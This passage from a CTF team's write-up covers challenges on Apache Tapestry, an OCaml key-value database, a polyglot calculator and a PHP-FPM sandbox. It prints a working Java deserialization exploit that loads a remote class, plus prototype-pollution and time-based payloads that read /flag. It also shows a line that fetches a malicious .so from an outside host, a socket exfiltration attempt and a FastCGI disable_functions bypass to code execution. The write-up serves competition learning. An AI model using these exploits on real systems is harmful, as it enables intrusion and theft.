+    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">public</span> Object <span class="hljs-title">getExploit</span><span class="hljs-params">(String command)</span> <span class="hljs-keyword">throws</span> Exception </span>{
+        <span class="hljs-keyword">int</span> sep = command.lastIndexOf(<span class="hljs-string">':'</span>);
+        <span class="hljs-keyword">if</span> ( sep &lt; <span class="hljs-number">0</span> ) {
+            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(<span class="hljs-string">"Command format is: &lt;base_url&gt;:&lt;classname&gt;"</span>);
+        }
+
+        String url = command.substring(<span class="hljs-number">0</span>, sep);
+        String className = command.substring(sep + <span class="hljs-number">1</span>);
+
+        PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
+        Reflections.getField(PoolBackedDataSourceBase.class, <span class="hljs-string">"connectionPoolDataSource"</span>).set(b, <span class="hljs-keyword">new</span> PoolSource(className, url));
+        <span class="hljs-keyword">return</span> b;
+    }
+
+
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PoolSource</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ConnectionPoolDataSource</span>, <span class="hljs-title">Referenceable</span> </span>{
+
+        <span class="hljs-keyword">private</span> String className;
+        <span class="hljs-keyword">private</span> String url;
+
+        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PoolSource</span> <span class="hljs-params">( String className, String url )</span> </span>{
+            <span class="hljs-keyword">this</span>.className = className;
+            <span class="hljs-keyword">this</span>.url = url;
+        }
+
+        <span class="hljs-function"><span class="hljs-keyword">public</span> Reference <span class="hljs-title">getReference</span> <span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NamingException </span>{
+            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Reference(<span class="hljs-string">"exploit"</span>, <span class="hljs-keyword">this</span>.className, <span class="hljs-keyword">this</span>.url);
+        }
+
+        <span class="hljs-function"><span class="hljs-keyword">public</span> PrintWriter <span class="hljs-title">getLogWriter</span> <span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException </span>{<span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;}
+        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setLogWriter</span> <span class="hljs-params">( PrintWriter out )</span> <span class="hljs-keyword">throws</span> SQLException </span>{}
+        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setLoginTimeout</span> <span class="hljs-params">( <span class="hljs-keyword">int</span> seconds )</span> <span class="hljs-keyword">throws</span> SQLException </span>{}
+        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getLoginTimeout</span> <span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException </span>{<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}
+        <span class="hljs-function"><span class="hljs-keyword">public</span> Logger <span class="hljs-title">getParentLogger</span> <span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLFeatureNotSupportedException </span>{<span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;}
+        <span class="hljs-function"><span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title">getPooledConnection</span> <span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException </span>{<span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;}
+        <span class="hljs-function"><span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title">getPooledConnection</span> <span class="hljs-params">( String user, String password )</span> <span class="hljs-keyword">throws</span> SQLException </span>{<span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;}
+
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{
+        Object exp = getExploit(<span class="hljs-string">"http://240.240.240.240:1234/:Exploit"</span>);
+        <span class="hljs-keyword">try</span> {
+            ClientDataEncoder en = <span class="hljs-keyword">new</span> ClientDataEncoderImpl(<span class="hljs-keyword">null</span>, <span class="hljs-string">"TOP_SECRET_PASSPHRASE_YOU_WILL_NEVER_KNOW:)"</span>, <span class="hljs-keyword">null</span>,
+                <span class="hljs-string">"does not matter"</span>, <span class="hljs-keyword">null</span>);
+            ClientDataSink sink = en.createSink();
+            ObjectOutputStream s = sink.getObjectOutputStream();
+            s.writeUTF(<span class="hljs-string">"1234"</span>);
+            s.writeBoolean(<span class="hljs-keyword">true</span>);
+            s.writeObject(exp);
+            s.close();
+            String out = sink.getClientData();
+            System.out.println(out);
+        } <span class="hljs-keyword">catch</span> (IOException i) {
+            i.printStackTrace();
+            <span class="hljs-keyword">return</span>;
+        }
+    }
+}</code></pre><p>The server will try to fetch <code>http://240.240.240.240:1234/Exploit.class</code> to load the class. Create an <code>Exploit.class</code> by:</p>
+<pre class="hljs"><code><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exploit</span> </span>{ 
+  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Exploit</span><span class="hljs-params">()</span> </span>{ 
+    <span class="hljs-keyword">try</span> { 
+      Runtime.getRuntime().exec(<span class="hljs-keyword">new</span> String[]{<span class="hljs-string">"bash"</span>, <span class="hljs-string">"-c"</span>,
+        <span class="hljs-string">"sleep 5"</span>
+      }).waitFor();
+    } <span class="hljs-keyword">catch</span> (Exception e) { 
+    } 
+  }
+}</code></pre><p>Refer to <a href="https://blog.csdn.net/fnmsd/article/details/88959428#c3p0">this article</a>.</p>
+<p>Flag: <code>flag{Apache Tapestry is too old. They maybe wont fix this bug :(}</code></p>
+<p>By the way, the author said it&#39;s related to this <a href="CVE-2014-1972">CVE</a>.</p>
+<h4 id="failed-attempts"><a class="header-link" href="#failed-attempts"></a>Failed Attempts</h4>
+<ul class="list">
+<li>CVE: The version of Apache Tapestry is 5.4.3. From 5.4.3 to 5.4.4 they fixed <a href="https://issues.apache.org/jira/browse/TAP5-2601">this</a> and <a href="https://git-wip-us.apache.org/repos/asf?p=tapestry-5.git;a=shortlog;h=refs/tags/5.4.4">this one</a>, but I don&#39;t find anything interesting there.</li>
+<li>Using Python to spoof the HMAC: I still have no idea why the signature is different. Finally I have to use Tapestry&#39;s class to forge the signature.</li>
+<li>Server fail to deserialize: It was because the server will <a href="https://github.com/apache/tapestry-5/blob/85cc611fbad4a3574664b33ce9adf614b4f0fe07/tapestry-core/src/main/java/org/apache/tapestry5/corelib/components/Form.java#L723-L724">first read 2 data type</a>. It&#39;s required to provide a String and a Boolean to make it parse correctly.</li>
+<li>No <code>nc</code> available: The remote server does not have <code>nc</code> command...... I use a reverse shell to read the flag.</li>
+</ul>
+<h3 id="babydb"><a class="header-link" href="#babydb"></a>BabyDB</h3>
+<p>author is <a href="https://github.com/septyem">septyem</a></p>
+<p>Key-value database service written in ocaml
+Isomorphism between key-value db and ... the filesystem!
+so use filename as key,
+and let&#39;s see what could go wrong</p>
+<p>Find something unexpected when I just begin to play with bap and ocaml</p>
+<p>My first impression to state monad is something like global variable - which is totally wrong</p>
+<p><code>let whoami = fun _ -&gt; SessionState.get</code></p>
+<pre class="hljs"><code><span class="hljs-keyword">let</span> out = <span class="hljs-keyword">match</span> is_default <span class="hljs-keyword">with</span>
+| <span class="hljs-literal">true</span> -&gt; real_login <span class="hljs-literal">false</span> (whoami sess) cont <span class="hljs-params">...</span>
+| <span class="hljs-literal">false</span> -&gt; real_login <span class="hljs-literal">true</span> (whoami sess) cont <span class="hljs-params">...</span></code></pre><p>The wrong way to apply it and you will just get empty string ( from real case when I writing ocaml)
+Just login as any user and login with empty name again</p>
+<h3 id="114514-calcalcalc"><a class="header-link" href="#114514-calcalcalc"></a>114514 CALCALCALC</h3>
+<p>This challenge is a modifed version from <a href="https://github.com/CTFTraining/rctf_2019_calcalcalc">0CTF/TCTF qual</a>, but the author said <a href="https://github.com/zsxsoft/my-ctf-challenges/blob/master/calcalcalc-family/readme.md">there is no intended solution</a>. Therefore this challenge is modified to a new version in the final.</p>
+<p>Basically, the original idea of the challenge is to write a polyglot which will return the flag in Python3, nodejs and php. However, this challenge adds a new constraint:</p>
+<pre class="hljs"><code>diff -r rctf_2019_calcalcalc/frontend/src/expression.validator.ts src/frontend/src/expression.validator.ts
+23c23
+&lt;                   if (!/^[0-9a-z\[\]\(\)\+\-\*\/ \t]+$/i.test(str)) {
+<span class="hljs-comment">---</span>
+&gt;                   if (str !== "114+514") {</code></pre><pre class="hljs"><code><span class="hljs-keyword">import</span> {registerDecorator, ValidationOptions, ValidationArguments} from <span class="hljs-string">'class-validator'</span>;
+<span class="hljs-keyword">import</span> CalculateModel from <span class="hljs-string">'./calculate.model'</span>;
+
+<span class="hljs-keyword">export</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ExpressionValidator</span>(<span class="hljs-params">property: <span class="hljs-built_in">number</span>, validationOptions?: ValidationOptions</span>) </span>{
+   <span class="hljs-keyword">return</span> (object: <span class="hljs-built_in">Object</span>, propertyName: <span class="hljs-built_in">string</span>) =&gt; {
+        registerDecorator({
+            name: <span class="hljs-string">'ExpressionValidator'</span>,
+            target: object.constructor,
+            propertyName,
+            constraints: [property],
+            options: validationOptions,
+            validator: {
+                validate(value: <span class="hljs-built_in">any</span>, args: ValidationArguments) {
+                  <span class="hljs-keyword">const</span> str = value ? value.toString() : <span class="hljs-string">''</span>; 
+                  <span class="hljs-keyword">if</span> (str.length === <span class="hljs-number">0</span>) {
+                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+                  } 
+                  <span class="hljs-keyword">if</span> (!(args.object as CalculateModel).isVip) {
+                    <span class="hljs-keyword">if</span> (str.length &gt;= args.constraints[<span class="hljs-number">0</span>]) {
+                      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+                    } 
+                  } 
+                  <span class="hljs-keyword">if</span> (str !== <span class="hljs-string">"114+514"</span>) {
+                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+                  } 
+                  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
+                },
+            },
+        }); 
+   };                                                                                                                          
+}</code></pre><p>The input string can only be <code>114+514</code>. It sounds almost absurd to exploit this with such a strict check. There is also other modification compared to the original challenge: it&#39;s using JSON instead of BSON.First we have to bypass the <code>isVIP</code> check. </p>
+<p>Fisrt we have to bypass the <code>isVip</code> check. Following the original challenge&#39;s writeup, by replacing the content-type to JSON we can make the parser parse our variable:</p>
+<pre class="hljs"><code><span class="hljs-attribute">Content-Type</span>: application/json
+
+<span class="json">{<span class="hljs-attr">"expression"</span>:<span class="hljs-string">"MORE_THAN_15_BYTES_STRING"</span>, <span class="hljs-attr">"isVip"</span>: <span class="hljs-literal">true</span>}</span></code></pre><p>Obviously, the next thing is to bypass the <code>str !=== &quot;114+514&quot;</code> check. We got stuck here for a few hours but quickly javascript template pollution <code>__proto__</code> came to our mind. @kaibro simply fuzzs a little bit and got this:</p>
+<pre class="hljs"><code>{<span class="hljs-string">"__proto__"</span><span class="hljs-symbol">:</span>{<span class="hljs-string">"constructor"</span><span class="hljs-symbol">:nu</span>ll},<span class="hljs-string">"expression"</span><span class="hljs-symbol">:</span><span class="hljs-string">"5278123+1"</span>, <span class="hljs-string">"isVip"</span><span class="hljs-symbol">:tr</span>ue}
+
+=&gt; <span class="hljs-number">5278124</span></code></pre><p>We found this by fuzzing without inspecting the source code. In the post-competition salon the author said this:</p>
+<pre class="hljs"><code><span class="hljs-built_in">read</span> <span class="hljs-keyword">the</span> src <span class="hljs-keyword">of</span> nestJS, <span class="hljs-built_in">class</span>-transformer <span class="hljs-keyword">to</span> convert json <span class="hljs-keyword">to</span> a target <span class="hljs-built_in">class</span>, <span class="hljs-keyword">but</span> didn’t strip __proto__
+{<span class="hljs-string">"expression"</span>:<span class="hljs-string">"1+1"</span>, __proto__<span class="hljs-string">":{}}</span></code></pre><p>Anyway, the rest is to write a polyglot, but can we still exploit the service using time-based attack? Although the backend&#39;s timeout becomes 1 sec to prevent from possible side-channel attack, it turns out that this is enough for a LAN-based user XD</p>
+<pre class="hljs"><code>valid input
+<span class="hljs-built_in">real</span>    <span class="hljs-number">0</span>m0<span class="hljs-number">.147s</span>
+
+
+invalid input
+<span class="hljs-built_in">real</span>    <span class="hljs-number">0</span>m0<span class="hljs-number">.311s</span></code></pre><p>So let&#39;s do this: my payload is php-based time-based side channel attack. Additionally, this is also a valid string in nodejs and Python, though I think it does not matter at all. This payload will sleep for 1 second if my guess is correct.</p>
+<pre class="hljs"><code>content-type: application/json
+
+{<span class="hljs-string">"__proto__"</span>:{<span class="hljs-string">"constructor"</span>:<span class="hljs-string">""</span>},<span class="hljs-string">"expression"</span>:<span class="hljs-string">"\"${sleep(ord(file_get_contents('/flag')[0])==114)}\""</span>, <span class="hljs-string">"isVip"</span>:<span class="hljs-keyword">false</span>}</code></pre><p>Of course you can write <a href="https://github.com/zsxsoft/my-ctf-challenges/blob/master/calcalcalc-family/2.md">a valid polyglot</a> but I&#39;m too lazy to do that :P</p>
+<p>Here is the juicy flag: <code>flag{114 514 1919 810 is a magic bumber}</code>.</p>
+<h4 id="failed-attempts-1"><a class="header-link" href="#failed-attempts-1"></a>Failed Attempts</h4>
+<ul class="list">
+<li>DNS-based leak: <code>__import__(&quot;socket&quot;).socket().connect((&quot;example.com&quot;,1))</code>. Unfortunately the backend server seems to block all the outgoing requests.</li>
+<li>Other failed fuzzing attempts:<pre class="hljs"><code><span class="hljs-string">"__proto__"</span>:{<span class="hljs-string">"__proto__"</span>:{<span class="hljs-string">"constructor"</span>:<span class="hljs-string">"a"</span>}} <span class="hljs-number">500</span>
+<span class="hljs-string">"__proto__"</span>:{<span class="hljs-string">"__proto__"</span>:{<span class="hljs-string">"constructor"</span>:<span class="hljs-string">""</span>}} <span class="hljs-number">200</span>
+<span class="hljs-string">"__proto__"</span>:{<span class="hljs-string">"__proto__"</span>:{<span class="hljs-string">"constructor"</span>:null}} <span class="hljs-number">200</span>
+<span class="hljs-string">"__proto__"</span>:{<span class="hljs-string">"constructor"</span>:<span class="hljs-string">"a"</span>} <span class="hljs-number">500</span>
+<span class="hljs-string">"__proto__"</span>:{<span class="hljs-string">"constructor"</span>:true} <span class="hljs-number">500</span>
+<span class="hljs-string">"__proto__"</span>:{<span class="hljs-string">"constructor"</span>:false} <span class="hljs-number">200</span></code></pre></li>
+</ul>
+<h3 id="wallbreaker-(not-very)-hard"><a class="header-link" href="#wallbreaker-(not-very)-hard"></a>Wallbreaker (not very) Hard</h3>
+<h4 id="problem"><a class="header-link" href="#problem"></a>Problem</h4>
+<ul class="list">
+<li>This challenge environment is same as 0CTF 2019 qual - Wallbreaker Easy<ul class="list">
+<li>PHP-FPM</li>
+<li>PHP 7.2</li>
+<li>strict <code>disable_functions</code><ul class="list">
+<li><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,putenv,proc_open,passthru,symlink,link,syslog,imap_open,dl,system,mb_send_mail,mail,error_log</code></li>
+<li>no <code>putenv</code> this time :p</li>
+</ul>
+</li>
+<li><code>open_basedir: /var/www/html:/tmp</code></li>
+</ul>
+</li>
+</ul>
+<p class="img-container"><img src="https://i.imgur.com/AJoNARW.png" alt=""></p>
+<ul class="list">
+<li>This challenge tells us there is a backdoor in somewhere</li>
+<li>After scanning, I found <code>.index.php.swp</code><ul class="list">
+<li>Recover it and get the backdoor key: <code>eval($_POST[&quot;anfkBJbfqkfqasd&quot;]);</code></li>
+</ul>
+</li>
+<li>OK, it&#39;s time for bypass <code>disable_functions</code>和<code>open_basedir</code></li>
+</ul>
+<h4 id="exploit"><a class="header-link" href="#exploit"></a>Exploit</h4>
+<ul class="list">
+<li>In 0CTF qual, I forged fastcgi protocol to bypass <code>open_basedir</code> (overwrite the settings)</li>
+<li>But I found there is another way that is possible to bypass <code>disable_functions</code> to RCE<ul class="list">
+<li>using the <code>extension</code>!</li>
+</ul>
+</li>
+<li>So we just need to write the <code>extension_dir</code> and <code>extension</code> in <code>PHP_ADMIN_VALUE</code>, then we can load arbitrary extension</li>
+<li>First step is to upload a RCE extension:</li>
+</ul>
+<pre class="hljs"><code>file_put_contents(<span class="hljs-string">"/tmp/bad.so"</span>, file_get_contents(<span class="hljs-string">"http://kaibro.tw/bad.so"</span>));</code></pre><ul class="list">
+<li>Before building the fastcgi payload, we should find out its UNIX Socket path (if it use tcp, we need to find the port)</li>
+</ul>
+<pre class="hljs"><code>$file_list = <span class="hljs-keyword">array</span>();
+$it = <span class="hljs-keyword">new</span> DirectoryIterator(<span class="hljs-string">"glob:///v??/run/php/*"</span>);
+<span class="hljs-keyword">foreach</span>($it <span class="hljs-keyword">as</span> $f) {  
+    $file_list[] = $f-&gt;__toString();
+}
+$it = <span class="hljs-keyword">new</span> DirectoryIterator(<span class="hljs-string">"glob:///v??/run/php/.*"</span>);
+<span class="hljs-keyword">foreach</span>($it <span class="hljs-keyword">as</span> $f) {  
+    $file_list[] = $f-&gt;__toString();
+}
+sort($file_list);  
+<span class="hljs-keyword">foreach</span>($file_list <span class="hljs-keyword">as</span> $f){  
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">"{$f}&lt;br/&gt;"</span>;
+}</code></pre><p>=&gt; <code>/var/run/php/U_wi11_nev3r_kn0w.sock</code></p>
+<ul class="list">
+<li>Then, starting to create FastCGI payload to overwrite settings. Here is my tool to generate payload: <a href="https://github.com/w181496/FuckFastcgi/">Tool</a><ul class="list">
+<li>change the config, then run it</li>
+</ul>
+</li>
+</ul>
+<p class="img-container"><img src="https://i.imgur.com/7yJKy5V.png" alt=""></p>
+<ul class="list">
+<li>RCE Get!</li>
+<li><code>/readflag</code> =&gt; <code>flag{PHP-FPM is awesome and I think the best pratice is chroot your PHP}</code></li>
+</ul>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
